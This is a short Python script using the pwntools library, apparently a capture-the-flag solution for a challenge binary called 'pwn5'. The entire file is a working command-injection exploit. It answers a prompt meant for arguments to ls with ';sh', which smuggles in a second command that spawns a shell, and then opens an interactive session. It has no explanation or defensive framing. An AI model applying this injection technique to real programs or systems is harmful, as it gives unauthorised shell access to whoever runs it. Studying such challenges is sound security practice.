#!/usr/bin/python 
from pwn import *

p = process("./pwn5")

p.sendafter("pass to ls:\n", ';sh')

p.interactive()
